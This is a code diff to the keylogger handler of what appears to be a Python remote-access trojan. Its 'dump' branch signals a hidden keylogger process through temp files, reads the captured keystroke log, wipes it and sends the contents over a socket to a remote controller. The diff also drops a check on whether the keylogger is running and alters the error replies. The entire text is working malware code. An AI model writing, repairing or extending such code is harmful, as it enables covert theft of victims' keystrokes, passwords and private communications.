@@ -323,10 +323,6 @@ def keylogger(option):
         objSettings.close()
 
     elif option == "dump":
-        command = subprocess.check_output("tasklist", shell=True)
-        if not b"spbkhost.exe" in command:  # check if keylogger is running
-            objSocket.send(str.encode("error"))
-            return
 
         objSettings = open(TMP + "/spbky.txt", "w")
         objSettings.write("dump")  # give signal to dump
@@ -335,16 +331,17 @@ def keylogger(option):
         time.sleep(2)
 
         if not os.path.isfile(TMP + "/spblog.txt"):
-            objSocket.send(str.encode("error2"))
+            objSocket.send(str.encode("error"))
             return
 
         objTxtFile = open(TMP + "/spblog.txt", "r")  # read logs
         strLogs = objTxtFile.read()
+        objTxtFile.close()
+        open(TMP + "/spblog.txt", "w").close()  # clear log contents
 
         if strLogs == "":
-            strLogs = "No logs"
-
-        objTxtFile.close()
+            objSocket.send(str.encode("error"))
+            return
 
         time.sleep(0.2)
         objSocket.send(str.encode(str(len(strLogs))))  # send buffer size
